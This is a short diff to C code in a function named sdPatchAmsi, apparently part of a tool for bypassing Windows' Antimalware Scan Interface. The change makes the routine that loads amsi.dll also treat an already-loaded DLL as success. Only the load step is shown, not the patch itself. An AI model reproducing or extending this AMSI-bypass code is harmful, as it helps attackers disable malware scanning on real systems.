@@ -160,7 +160,7 @@ BOOL sdPatchAmsi(PVOID hNtdll) {
 	// load amsi.dll
 	LdrLoadDll = (fn_LdrLoadDll)sdGetProcAddress(hNtdll, LDR_GET_DLL);
 	status = LdrLoadDll(0, 0, &ustrDll, &hAmsi);
-	if (status != STATUS_SUCCESS) {
+	if (status != STATUS_SUCCESS && status != STATUS_IMAGE_ALREADY_LOADED) {
 		return FALSE;
 	}
 	
